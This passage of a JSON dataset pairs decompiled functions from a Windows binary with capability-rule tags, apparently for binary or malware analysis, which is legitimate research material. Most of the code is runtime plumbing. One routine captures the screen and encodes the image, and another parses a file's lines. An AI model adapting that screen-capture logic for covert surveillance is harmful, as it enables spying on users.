        "decompiled_code": "\nint32_t * __cdecl fcn.00418250(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = **(in_ECX + 0x38);\n    *arg_8h = iVar1;\n    fcn.00429e0b(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.00429e33();\n    return arg_8h;\n}\n",
        "token_count": 136
    },
    "00418570": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418570(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_1 + 0x30) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0x10) = 0;\n    *(param_1 + 0x14) = 0x201;\n    *(param_1 + 0x18) = 6;\n    *(param_1 + 0x1c) = 0;\n    *(param_1 + 0x20) = 0;\n    *(param_1 + 0x24) = 0;\n    *(param_1 + 0x28) = 0;\n    *(param_1 + 0x2c) = 0;\n    fcn.00418440(0, 0);\n    puVar1 = fcn.0042b2b1(4);\n    if (puVar1 != NULL) {\n        uVar2 = fcn.0042a117();\n        *puVar1 = uVar2;\n        iVar3 = fcn.00429ed6();\n        fcn.00429e0b(0);\n        if (*(iVar3 + 4) != -1) {\n            *(iVar3 + 4) = *(iVar3 + 4) + 1;\n        }\n        fcn.00429e33();\n        *(param_1 + 0x30) = puVar1;\n        return;\n    }\n    *(param_1 + 0x30) = 0;\n    return;\n}\n",
        "token_count": 377
    },
    "00418650": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00418650(uint *param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = param_1[0xe];\n    *param_1 = 0x44785c;\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (uVar2 != 0) {\n            fcn.00429e0b(0);\n            iVar3 = *(uVar2 + 4);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                *(uVar2 + 4) = iVar3 + -1;\n            }\n            iVar3 = *(uVar2 + 4);\n            fcn.00429e33();\n            puVar4 = ~-(iVar3 != 0) & uVar2;\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        fcn.0042a679(puVar1);\n    }\n    fcn.0042a473();\n    return;\n}\n",
        "token_count": 269
    },
    "00418ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.00418ec0(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e44b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    *param_1 = 0x44785c;\n    fcn.0042a459(uVar1);\n    var_4h = 0;\n    puVar2 = fcn.0042b2b1(4);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        uVar3 = fcn.0042a117();\n        *puVar2 = uVar3;\n        iVar4 = fcn.00429ed6();\n        fcn.00429e0b(0);\n        if (*(iVar4 + 4) != -1) {\n            *(iVar4 + 4) = *(iVar4 + 4) + 1;\n        }\n        fcn.00429e33();\n    }\n    param_1[4] = param_1 + 2;\n    param_1[8] = param_1 + 6;\n    param_1[9] = param_1 + 7;\n    param_1[0xe] = puVar2;\n    param_1[5] = param_1 + 3;\n    param_1[0xc] = param_1 + 10;\n    param_1[0xd] = param_1 + 0xb;\n    param_1[3] = 0;\n    *param_1[9] = 0;\n    *param_1[0xd] = 0;\n    *param_1[4] = 0;\n    *param_1[8] = 0;\n    *param_1[0xc] = 0;\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 514
    },
    "00419390": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00419390(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0042d722(arg_8h, arg_ch);\n    return uVar1 & 0xffffff00 | uVar1 != 0xffffffff;\n}\n",
        "token_count": 72
    },
    "00419580": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00419580(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e4d8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar5 = &var_10h;\n    uVar3 = fcn.004151b0(puVar5);\n    var_4h = 0;\n    piVar4 = fcn.00418fb0(uVar3);\n    var_4h = 0xffffffff;\n    if (var_10h != 0) {\n        uVar3 = 0;\n        fcn.00429e0b(0);\n        iVar1 = *(var_10h + 4);\n        if ((iVar1 != 0) && (iVar1 != -1)) {\n            *(var_10h + 4) = iVar1 + -1;\n        }\n        iVar1 = *(var_10h + 4);\n        fcn.00429e33(uVar3, puVar5, uVar2);\n        puVar5 = ~-(iVar1 != 0) & var_10h;\n        if (puVar5 != NULL) {\n            (***puVar5)(1);\n        }\n    }\n    (**(*piVar4 + 0x18))(arg_8h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 412
    },
    "00419dc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl fcn.00419dc0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint *var_2ch;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43e5f8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar2;\n    iVar3 = fcn.00415370(arg_8h, &var_30h, &var_34h);\n    if (iVar3 != 0) {\n        iVar3 = fcn.004208c0(var_30h, var_34h);\n        if (iVar3 != 0) {\n            iVar3 = (**0x462eb8)(iVar3, 0x44791c, uVar2);\n            if (iVar3 != 0) {\n                var_18h = 0xf;\n                var_1ch = 0;\n                var_2ch = var_2ch & 0xffffff00;\n                uVar4 = fcn.0042ad20(iVar3 + 0x10);\n                fcn.004062a0(iVar3 + 0x10, uVar4);\n                var_4h = 0;\n                uVar4 = fcn.0042ad20(0x447918);\n                iVar3 = fcn.0040b950(0x447918, 0, uVar4);\n                if (iVar3 != -1) {\n                    fcn.00405ac0(iVar3, 0xffffffff);\n                }\n                arg_8h_00 = var_2ch;\n                if (var_18h < 0x10) {\n                    arg_8h_00 = &var_2ch;\n                }\n                iVar5 = fcn.00415410(arg_8h_00, &var_30h, &var_38h);\n                iVar3 = var_30h;\n                if ((iVar5 != 0) && (4 < var_38h)) {\n                    iVar5 = fcn.0042bc6b(var_30h, 0x447274, 5);\n                    if (iVar5 == 0) {\n                        cVar1 = fcn.00415490(iVar3 + 5, var_38h - 5, &var_34h, &var_30h);\n                        if ((cVar1 != '\\0') && (var_30h == 0x20)) {\n                            fcn.00415560(var_34h, arg_ch, arg_10h);\n                        }\n                    }\n                }\n                if (0xf < var_18h) {\n                    fcn.0042a679(var_2ch);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042a75a(arg_ch);\n    return;\n}\n",
        "token_count": 802
    },
    "0041ce40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5a4h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041ce40(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uchar *noname_5;\n    int32_t iVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t **in_FS_OFFSET;\n    bool bVar14;\n    uint var_5a4h;\n    uint var_53ch;\n    uint var_4f4h;\n    uint var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_4d9h;\n    uint var_4bch;\n    uint var_4ach;\n    uint var_4a8h;\n    uint var_4a0h;\n    uint var_490h;\n    uint var_48ch;\n    uint var_484h;\n    uint var_474h;\n    uint var_470h;\n    uint var_468h;\n    uint var_458h;\n    uint var_454h;\n    uint var_44ch;\n    uint var_43ch;\n    uint var_438h;\n    uint var_430h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_414h;\n    uint var_404h;\n    uint var_400h;\n    uint var_3f8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    uchar *arg_8h;\n    uint var_5a4h_2;\n    uint in_stack_fffffaf4;\n    uint var_4f4h_2;\n    uint var_4f0h;\n    uint32_t uStack1264;\n    uint uStack1260;\n    uint32_t var_4e4h_2;\n    int32_t var_4e0h_2;\n    uint var_4d8h;\n    uint32_t var_4c4h;\n    uint32_t auStack1216 [4];\n    uint uStack1200;\n    uint32_t uStack1196;\n    uint32_t auStack1188 [4];\n    uint uStack1172;\n    uint32_t uStack1168;\n    uint *var_484h_2;\n    uint32_t var_474h_2;\n    uint32_t uStack1140;\n    uint *var_468h_2;\n    uint32_t uStack1116;\n    uint32_t uStack1112;\n    uint *var_44ch_2;\n    uint32_t uStack1088;\n    uint32_t uStack1084;\n    uint *var_430h_2;\n    uint32_t var_420h_2;\n    uint32_t var_41ch_2;\n    uint *var_414h_2;\n    int32_t var_404h_2;\n    uint32_t var_400h_2;\n    uchar auStack1020 [1000];\n    uint32_t uStack20;\n    int32_t *piStack16;\n    uint uStack12;\n    uint var_4h_2;\n    \n    var_4h_2 = 0xffffffff;\n    uStack12 = 0x43e98e;\n    piStack16 = *in_FS_OFFSET;\n    uStack20 = *0x4506f0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &piStack16;\n    uStack1260 = param_1;\n    fcn.0042a6e0();\n    fcn.00420a40(0x28);\n    (**0x463038)();\n    noname_5 = auStack1020;\n    uVar10 = *0x451c88;\n    (**0x463038)();\n    arg_8h = auStack1020;\n    iVar2 = fcn.004209b0(arg_8h);\n    if (iVar2 != 0) {\n        fcn.0041cb10(auStack1020, 1, 0x40, 1);\n        var_400h_2 = 0xf;\n        var_404h_2 = 0;\n        var_414h_2 = var_414h_2 & 0xffffff00;\n        var_4e0h_2 = 0;\n        uStack1140 = 0xf;\n        var_474h_2 = 0;\n        var_484h_2 = var_484h_2 & 0xffffff00;\n        uStack1112 = 0xf;\n        uStack1116 = 0;\n        var_468h_2 = var_468h_2 & 0xffffff00;\n        uStack1084 = 0xf;\n        uStack1088 = 0;\n        var_44ch_2 = var_44ch_2 & 0xffffff00;\n        var_41ch_2 = 0xf;\n        var_420h_2 = 0;\n        var_430h_2 = var_430h_2 & 0xffffff00;\n        var_4h_2._0_1_ = 5;\n        var_4h_2._1_3_ = 0;\n        while( true ) {\n            uVar3 = fcn.004151b0(&uStack1264);\n            var_4h_2._0_1_ = 6;\n            piVar4 = fcn.00418fb0(uVar3);\n            uVar8 = uStack1264;\n            var_4h_2._0_1_ = 5;\n            if (uStack1264 != 0) {\n                fcn.00429e0b(0);\n                iVar2 = *(uVar8 + 4);\n                if ((iVar2 != 0) && (iVar2 != -1)) {\n                    *(uVar8 + 4) = iVar2 + -1;\n                }\n                iVar2 = *(uVar8 + 4);\n                fcn.00429e33();\n                puVar13 = ~-(iVar2 != 0) & uVar8;\n                if (puVar13 != NULL) {\n                    (***puVar13)(1);\n                }\n            }\n            uVar1 = (**(*piVar4 + 0x18))(10);\n            var_4e4h_2 = var_4e4h_2 & 0xffffff00 | uVar1;\n            piVar4 = fcn.00419c00();\n            uVar3 = *0x451bd8;\n            if ((*(*piVar4 + 4) + piVar4 & ~-((*(*(*piVar4 + 4) + 0xc + piVar4) & 6) != 0)) == 0) break;\n            uVar5 = fcn.0042ad20();\n            iVar2 = fcn.0040b950(uVar3, var_4e0h_2 + 1, uVar5);\n            if (iVar2 != -1) {\n                fcn.00405ac0(0, 9);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                iVar11 = puVar12 + var_404h_2 + -7;\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar12;\n                }\n                if (puVar13 + var_404h_2 == 0) {\n                    iVar11 = 0;\n                }\n                else {\n                    iVar11 = (puVar13 + var_404h_2) - iVar11;\n                }\n                fcn.00405ac0(iVar6, iVar11);\n                fcn.004061b0(&var_414h_2, 0, 0xffffffff);\n            }\n            uVar3 = *0x451ec0;\n            uVar5 = fcn.0042ad20();\n            iVar2 = fcn.0040b950(uVar3, iVar2 + 1, uVar5);\n            if (iVar2 != -1) {\n                fcn.00405ac0(0, 9);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                iVar11 = var_404h_2 + -7 + puVar12;\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar12;\n                }\n                if (var_404h_2 + puVar13 == 0) {\n                    iVar11 = 0;\n                }\n                else {\n                    iVar11 = (var_404h_2 + puVar13) - iVar11;\n                }\n                fcn.00405ac0(iVar6, iVar11);\n                fcn.004061b0(&var_414h_2, 0, 0xffffffff);\n            }\n            uVar3 = *0x452054;\n            uVar5 = fcn.0042ad20();\n            iVar2 = fcn.0040b950(uVar3, iVar2 + 1, uVar5);\n            if (iVar2 != -1) {\n                fcn.00405ac0(0, 9);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                iVar11 = puVar12 + var_404h_2 + -7;\n                puVar12 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar12 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar12;\n                }\n                if (puVar13 + var_404h_2 == 0) {\n                    iVar11 = 0;\n                }\n                else {\n                    iVar11 = (puVar13 + var_404h_2) - iVar11;\n                }\n                fcn.00405ac0(iVar6, iVar11);\n                fcn.004061b0(&var_414h_2, 0, 0xffffffff);\n            }\n            uVar3 = *0x452098;\n            uVar5 = fcn.0042ad20();\n            var_4e0h_2 = fcn.0040b950(uVar3, iVar2 + 1, uVar5);\n            if (var_4e0h_2 != -1) {\n                fcn.00405ac0(0, 0x1b);\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                iVar2 = puVar13 + var_404h_2;\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                iVar11 = puVar13 + var_404h_2 + -7;\n                puVar13 = var_414h_2;\n                if (var_400h_2 < 0x10) {\n                    puVar13 = &var_414h_2;\n                }\n                if (iVar11 == 0) {\n                    iVar6 = 0;\n                }\n                else {\n                    iVar6 = iVar11 - puVar13;\n                }\n                if (iVar2 != 0) {\n                    iVar2 = iVar2 - iVar11;\n                }\n                fcn.00405ac0(iVar6, iVar2);\n                uVar5 = 0xffffffff;\n                uVar3 = 0;\n                puVar13 = &var_414h_2;\n                arg_8h = arg_8h & 0xffffff00;\n                fcn.004061b0(puVar13, 0, 0xffffffff);\n                piVar4 = fcn.00423860(&var_4d8h, puVar13, uVar3, uVar5, arg_8h, noname_5, uVar10);\n                if (&var_430h_2 != piVar4) {\n                    if (0xf < var_41ch_2) {\n                        fcn.0042a679(var_430h_2);\n                    }\n                    var_41ch_2 = 0xf;\n                    var_420h_2 = 0;\n                    var_430h_2 = var_430h_2 & 0xffffff00;\n                    if (piVar4[5] < 0x10) {\n                        fcn.0042adb0(&var_430h_2, piVar4, piVar4[4] + 1);\n                    }\n                    else {\n                        var_430h_2 = *piVar4;\n                        *piVar4 = 0;\n                    }\n                    var_420h_2 = piVar4[4];\n                    var_41ch_2 = piVar4[5];\n                    piVar4[4] = 0;\n                    piVar4[5] = 0;\n                }\n                var_4h_2._0_1_ = 5;\n                if (0xf < var_4c4h) {\n                    fcn.0042a679(var_4d8h);\n                }\n            }\n            uVar7 = fcn.0042ad20(0x4452bc);\n            uVar8 = var_474h_2;\n            uVar9 = var_474h_2;\n            if (uVar7 <= var_474h_2) {\n                uVar9 = uVar7;\n            }\n            puVar13 = var_484h_2;\n            if (uStack1140 < 0x10) {\n                puVar13 = &var_484h_2;\n            }\n            iVar2 = fcn.0042bc6b(puVar13, 0x4452bc, uVar9);\n            bVar14 = iVar2 == 0;\n            if (bVar14) {\n                if (uVar8 < uVar7) {\n                    uVar8 = 0xffffffff;\n                }\n                else {\n                    uVar8 = uVar8 != uVar7;\n                }\n                bVar14 = uVar8 == 0;\n            }\n            if (!bVar14) {\n                uVar7 = fcn.0042ad20(0x4452bc);\n                uVar8 = uStack1116;\n                uVar9 = uStack1116;\n                if (uVar7 <= uStack1116) {\n                    uVar9 = uVar7;\n                }\n                puVar13 = var_468h_2;\n                if (uStack1112 < 0x10) {\n                    puVar13 = &var_468h_2;\n                }\n                iVar2 = fcn.0042bc6b(puVar13, 0x4452bc, uVar9);\n                bVar14 = iVar2 == 0;\n                if (bVar14) {\n                    if (uVar8 < uVar7) {\n                        uVar8 = 0xffffffff;\n                    }\n                    else {\n                        uVar8 = uVar8 != uVar7;\n                    }\n                    bVar14 = uVar8 == 0;\n                }\n                if (!bVar14) {\n                    uVar7 = fcn.0042ad20(0x4452bc);\n                    uVar8 = uStack1088;\n                    uVar9 = uStack1088;\n                    if (uVar7 <= uStack1088) {\n                        uVar9 = uVar7;\n                    }\n                    puVar13 = var_44ch_2;\n                    if (uStack1084 < 0x10) {\n                        puVar13 = &var_44ch_2;\n                    }\n                    iVar2 = fcn.0042bc6b(puVar13, 0x4452bc, uVar9);\n                    bVar14 = iVar2 == 0;\n                    if (bVar14) {\n                        if (uVar8 < uVar7) {\n                            uVar8 = 0xffffffff;\n                        }\n                        else {\n                            uVar8 = uVar8 != uVar7;\n                        }\n                        bVar14 = uVar8 == 0;\n                    }\n                    if (!bVar14) {\n                        uVar7 = fcn.0042ad20(0x4452bc);\n                        uVar8 = var_420h_2;\n                        uVar9 = var_420h_2;\n                        if (uVar7 <= var_420h_2) {\n                            uVar9 = uVar7;\n                        }\n                        puVar13 = var_430h_2;\n                        if (var_41ch_2 < 0x10) {\n                            puVar13 = &var_430h_2;\n                        }\n                        iVar2 = fcn.0042bc6b(puVar13, 0x4452bc, uVar9);\n                        uVar3 = uStack1260;\n                        bVar14 = iVar2 == 0;\n                        if (bVar14) {\n                            if (uVar8 < uVar7) {\n                                uVar8 = 0xffffffff;\n                            }\n                            else {\n                                uVar8 = uVar8 != uVar7;\n                            }\n                            bVar14 = uVar8 == 0;\n                        }\n                        if (!bVar14) {\n                            (**0x463038)(uStack1260, *0x4522e4);\n                            (**0x463038)(uVar3, *0x45229c);\n                            uVar10 = fcn.0040e740(auStack1188, &var_484h_2, 0x446ed4);\n                            var_4h_2._0_1_ = 8;\n                            puVar13 = fcn.00412a90(auStack1216, uVar10, &var_468h_2);\n                            var_4h_2 = CONCAT31(var_4h_2._1_3_, 9);\n                            if (0xf < puVar13[5]) {\n                                puVar13 = *puVar13;\n                            }\n                            (**0x463038)(uVar3, puVar13);\n                            if (0xf < uStack1196) {\n                                fcn.0042a679(auStack1216[0]);\n                            }\n                            uStack1196 = 0xf;\n                            uStack1200 = 0;\n                            auStack1216[0] = auStack1216[0] & 0xffffff00;\n                            var_4h_2._0_1_ = 5;\n                            if (0xf < uStack1168) {\n                                fcn.0042a679(auStack1188[0]);\n                            }\n                            uStack1168 = 0xf;\n                            uStack1172 = 0;\n                            auStack1188[0] = auStack1188[0] & 0xffffff00;\n                            (**0x463038)(uVar3, 0x4452fc);\n                            (**0x463038)(uVar3, *0x451d58);\n                            puVar13 = var_44ch_2;\n                            if (uStack1084 < 0x10) {\n                                puVar13 = &var_44ch_2;\n                            }\n                            (**0x463038)(uVar3, puVar13);\n                            (**0x463038)(uVar3, 0x4452fc);\n                            (**0x463038)(uVar3, *0x452258);\n                            puVar13 = var_430h_2;\n                            if (var_41ch_2 < 0x10) {\n                                puVar13 = &var_430h_2;\n                            }\n                            (**0x463038)(uVar3, puVar13);\n                            (**0x463038)(uVar3, 0x446f30);\n                            uVar3 = fcn.0042ad20();\n                            uVar10 = 0x4452bc;\n                            fcn.004062a0(0x4452bc, uVar3);\n                            noname_5 = fcn.0042ad20();\n                            arg_8h = 0x4452bc;\n                            fcn.004062a0(0x4452bc, noname_5);\n                            uVar3 = fcn.0042ad20(0x4452bc);\n                            fcn.004062a0(0x4452bc, uVar3);\n                            uVar3 = fcn.0042ad20(0x4452bc);\n                            fcn.004062a0(0x4452bc, uVar3);\n                            *0x45257c = *0x45257c + 1;\n                        }\n                    }\n                }\n            }\n        }\n        if (0xf < var_41ch_2) {\n            fcn.0042a679();\n        }\n        var_41ch_2 = 0xf;\n        var_420h_2 = 0;\n        var_430h_2 = var_430h_2 & 0xffffff00;\n        if (0xf < uStack1084) {\n            fcn.0042a679();\n        }\n        uStack1084 = 0xf;\n        uStack1088 = 0;\n        var_44ch_2 = var_44ch_2 & 0xffffff00;\n        if (0xf < uStack1112) {\n            fcn.0042a679();\n        }\n        uStack1112 = 0xf;\n        uStack1116 = 0;\n        var_468h_2 = var_468h_2 & 0xffffff00;\n        if (0xf < uStack1140) {\n            fcn.0042a679();\n        }\n        uStack1140 = 0xf;\n        var_474h_2 = 0;\n        var_484h_2 = var_484h_2 & 0xffffff00;\n        if (0xf < var_400h_2) {\n            fcn.0042a679();\n        }\n        var_400h_2 = 0xf;\n        var_404h_2 = 0;\n        var_414h_2 = var_414h_2 & 0xffffff00;\n        var_4h_2 = 0xffffffff;\n        fcn.0041cc80();\n        fcn.0042a309(&stack0xfffffac0);\n    }\n    *in_FS_OFFSET = piStack16;\n    fcn.0042a75a(in_stack_fffffaf4);\n    return;\n}\n",
        "token_count": 5297
    },
    "00420980": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420980(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (**0x462e7c)(arg_8h);\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "004209b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004209b0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (**0x462f88)(arg_8h);\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 84
    },
    "004209e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004209e0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (**0x462ecc)(arg_8h, 0x80000000, 3, 0, 3, 0x80, 0);\n    if (iVar1 != -1) {\n        iVar2 = (**0x462e84)(iVar1, &var_8h);\n        if (iVar2 != 0) {\n            (**0x462ed0)(iVar1);\n            return _var_8h;\n        }\n        (**0x462ed0)();\n    }\n    return 0;\n}\n",
        "token_count": 163
    },
    "00420b50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00420b50(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_8h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_38h = arg_ch;\n    var_54h = 1;\n    var_50h = 0;\n    var_4ch = 0;\n    var_48h = 0;\n    fcn.0042a6e0(&var_54h, 0, 0x10);\n    arg_8h = 0;\n    var_54h = 1;\n    iVar1 = (**0x463044)(&var_3ch, &var_54h);\n    if ((iVar1 == 0) && (iVar1 = (**0x462fa4)(0, 1, &var_2ch),  iVar1 == 0)) {\n        uVar2 = (**0x462e90)();\n        (**0x4630dc)(uVar2, &var_24h);\n        uVar3 = (**0x4630b8)(uVar2);\n        uVar4 = (**0x462f68)(uVar3);\n        var_30h = (**0x462ed4)(uVar3, var_1ch, var_18h);\n        var_40h = (**0x462eb4)(uVar4, var_30h);\n        (**0x462e94)(uVar4, 0, 0, var_1ch, var_18h, uVar3, 0, 0, 0xcc0020);\n        iVar1 = (**0x463004)(var_30h, 0, &var_28h);\n        if ((iVar1 == 0) &&\n           ((iVar1 = fcn.00420aa0(0x447f5c, &var_14h),  iVar1 != -1 &&\n            (iVar1 = (**0x462fd8)(var_28h, var_2ch, &var_14h, 0),  iVar1 == 0)))) {\n            (**0x462ea0)(var_2ch, &var_34h);\n            var_44h = (**0x462ee4)(var_34h);\n            arg_14h = (**0x462e78)(var_34h);\n            fcn.00429a10(var_38h, 0x447f4c, var_44h, arg_14h);\n            (**0x462eb4)(uVar4, var_40h);\n            (**0x462f18)(var_28h);\n            (**0x463024)(var_3ch);\n            (**0x463050)(var_30h);\n            (**0x463050)(uVar4);\n            (**0x46303c)(uVar2, uVar3);\n            (**0x4630ac)(uVar2);\n        }\n    }\n    fcn.0042a75a(arg_8h);\n    return;\n}\n",
        "token_count": 815
    },
    "00420e30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420e30(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    uVar1 = **(in_ECX + 0x20);\n    if ((uVar1 != 0) && (**(in_ECX + 0x10) <= uVar1 && uVar1 != **(in_ECX + 0x10))) {\n        if ((arg_8h == -1) || ((arg_8h == *(uVar1 - 1) || ((*(in_ECX + 0x40) & 2) == 0)))) {\n            **(in_ECX + 0x30) = **(in_ECX + 0x30) + 1;\n            **(in_ECX + 0x20) = **(in_ECX + 0x20) + -1;\n            if (arg_8h != -1) {\n                ***(in_ECX + 0x20) = arg_8h;\n                return arg_8h;\n            }\n            return 0;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 255
    },
    "00427470": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
